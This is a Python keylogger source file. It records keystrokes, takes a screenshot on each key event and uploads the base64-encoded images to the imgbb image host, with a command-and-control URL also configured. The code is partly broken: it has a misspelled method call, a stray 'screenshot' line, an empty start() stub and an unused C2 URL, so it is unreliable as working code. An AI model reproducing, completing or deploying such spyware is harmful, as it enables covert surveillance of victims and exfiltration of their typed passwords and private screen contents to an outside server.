import keyboard
from threading import Timer
from datetime import datetime
from base64 import b64encode
import requests
import io
import pyautogui
import key_api

KEY_IMG_BB = key_api.img_bb
INTERVAL = 30
C2_URL = key_api.c2_url

class Keylogger:
    def __init__(self, interval):

        self.interval = interval
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()

    def callback(self, event):
        # key UP is occured
        name = event.name
        if len(name) > 1:
            name=name.rplace(" ", "_")
            name=name.upper()
            name = "[{}]".format(name)
        
        self.log += name

        screenshot
        screenshot = pyautogui.screenshot("1234.png")
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes = img_bytes.getvalue()
        img_encoded = b64encode(img_bytes)

        url = "https://api.imgbb.com/1/upload"
        payload = {
            "key": KEY_IMG_BB ,
            "image": img_encoded
        }
        res =requests.post(url, payload)

    def start(self):
        pass

    
if __name__ == "__main__":

    keylogger = Keylogger(interval=INTERVAL)
    keylogger.start()